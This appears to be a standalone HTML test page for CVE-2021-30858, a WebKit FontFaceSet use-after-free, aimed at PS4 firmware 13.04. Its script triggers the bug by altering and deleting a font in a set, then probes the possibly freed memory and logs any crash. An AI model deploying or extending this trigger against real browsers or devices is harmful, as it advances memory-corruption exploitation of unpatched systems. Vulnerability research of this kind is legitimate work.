<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CVE-2021-30858 Test</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 14px; }
        h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 10px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; max-width: 400px; }
        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; }
        .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; }
        .log { padding: 5px 0; border-bottom: 1px solid #333; }
        .log:last-child { border-bottom: none; }
        .success { color: #0f0; font-weight: bold; }
        .fail { color: #f00; font-weight: bold; }
        .warn { color: #ff0; font-weight: bold; }
        .info { color: #0ff; }
        pre { background: #111; border: 1px solid #333; padding: 10px; margin: 10px 0; overflow-x: auto; font-size: 12px; color: #0f0; }
    </style>
</head>
<body>
    <h1>⚠️ CVE-2021-30858 FontFaceSet UAF Test ⚠️</h1>
    
    <div style="text-align: center; margin-bottom: 20px;">
        <button class="btn" onclick="runTest()">🔥 TEST CVE-2021-30858</button>
    </div>
    
    <div class="section">
        <div class="title">📋 Test Log</div>
        <div id="log"></div>
    </div>

<script>
function log(msg, type) {
    var div = document.createElement('div');
    div.className = 'log ' + (type || '');
    div.textContent = '[' + new Date().toISOString().substr(11, 12) + '] ' + msg;
    document.getElementById('log').appendChild(div);
    document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
}

function runTest() {
    document.getElementById('log').innerHTML = '';
    
    log('='.repeat(60), 'info');
    log('CVE-2021-30858: FontFaceSet Use-After-Free Test', 'warn');
    log('PS4 Firmware: 13.04 | WebKit: 605.1.15', 'info');
    log('='.repeat(60), 'info');
    log('', '');
    
    // Step 1: Check prerequisites
    log('[STEP 1] Checking prerequisites...', 'info');
    
    if (typeof FontFace === 'undefined') {
        log('✗ FAIL: FontFace not available', 'fail');
        return;
    }
    log('✓ FontFace available', 'success');
    
    if (typeof FontFaceSet === 'undefined') {
        log('✗ FAIL: FontFaceSet not available', 'fail');
        return;
    }
    log('✓ FontFaceSet available', 'success');
    
    log('', '');
    
    // Step 2: Original PoC from Maddie Stone (Google Project Zero)
    log('[STEP 2] Testing original CVE-2021-30858 PoC...', 'info');
    log('Creating invalid FontFace object...', 'info');
    
    try {
        // Create a FontFace with invalid source - this should fail
        var fontFace1 = new FontFace("font1", "", {});
        log('✓ Created FontFace: font1', 'success');
        
        // Create a FontFaceSet with the invalid font
        log('Creating FontFaceSet with invalid font...', 'info');
        var fontFaceSet = new FontFaceSet([fontFace1]);
        log('✓ Created FontFaceSet', 'success');
        
        // Try to change the family - this triggers the bug in vulnerable versions
        log('Changing font family (triggers bug)...', 'info');
        fontFace1.family = "font2";
        log('✓ Changed family to: font2', 'success');
        
        log('', '');
        log('[RESULT] FontFaceSet operations succeeded', 'warn');
        log('This means the constructor does NOT throw an error', 'warn');
        log('Testing if UAF is exploitable...', 'info');
        log('', '');
        
        // Step 3: Try to trigger the UAF
        log('[STEP 3] Attempting to trigger Use-After-Free...', 'info');
        
        // Delete the font from the set
        var deleted = fontFaceSet.delete(fontFace1);
        log('fontFaceSet.delete() returned: ' + deleted, deleted ? 'warn' : 'info');
        
        // Check if the font is still in the set (it shouldn't be)
        var hasFont = fontFaceSet.has(fontFace1);
        log('fontFaceSet.has() returned: ' + hasFont, hasFont ? 'fail' : 'success');
        
        if (hasFont) {
            log('⚠️ WARNING: Font still in set after delete!', 'warn');
            log('This indicates improper cleanup - UAF possible!', 'warn');
        } else {
            log('✓ Font properly removed from set', 'success');
        }
        
        log('', '');
        
        // Step 4: Try to access the freed object
        log('[STEP 4] Attempting to access potentially freed memory...', 'info');
        
        try {
            // Try to iterate over the set
            var count = 0;
            fontFaceSet.forEach(function(font) {
                count++;
                log('Found font in set: ' + font.family, 'warn');
            });
            log('FontFaceSet.forEach() found ' + count + ' fonts', count > 0 ? 'warn' : 'success');
            
            // Try to get size
            log('FontFaceSet.size: ' + fontFaceSet.size, fontFaceSet.size > 0 ? 'warn' : 'success');
            
        } catch(e) {
            log('✗ ERROR during access: ' + e.message, 'fail');
            log('Error name: ' + e.name, 'fail');
            if (e.stack) {
                log('Stack trace:', 'fail');
                log(e.stack, 'fail');
            }
        }
        
    } catch(e) {
        log('', '');
        log('✗ EXCEPTION CAUGHT!', 'fail');
        log('Error: ' + e.message, 'fail');
        log('Error name: ' + e.name, 'fail');
        log('', '');
        
        if (e.message.includes('constructor') || e.message.includes('not a constructor')) {
            log('[ANALYSIS] FontFaceSet constructor throws error', 'info');
            log('This means CVE-2021-30858 is NOT exploitable via this method', 'info');
            log('WebKit version may have protections', 'info');
        } else {
            log('[ANALYSIS] Unexpected error - investigating...', 'warn');
        }
        
        if (e.stack) {
            log('', '');
            log('Stack trace:', 'fail');
            var pre = document.createElement('pre');
            pre.textContent = e.stack;
            document.getElementById('log').appendChild(pre);
        }
    }
    
    log('', '');
    log('='.repeat(60), 'info');
    log('Test Complete', 'info');
    log('='.repeat(60), 'info');
}

window.onerror = function(msg, url, line, col, error) {
    log('', '');
    log('💥 CRASH DETECTED!', 'fail');
    log('Message: ' + msg, 'fail');
    log('Line: ' + line + ', Column: ' + col, 'fail');
    if (error && error.stack) {
        log('Stack:', 'fail');
        var pre = document.createElement('pre');
        pre.textContent = error.stack;
        document.getElementById('log').appendChild(pre);
    }
    return true;
};
</script>
</body>
</html>
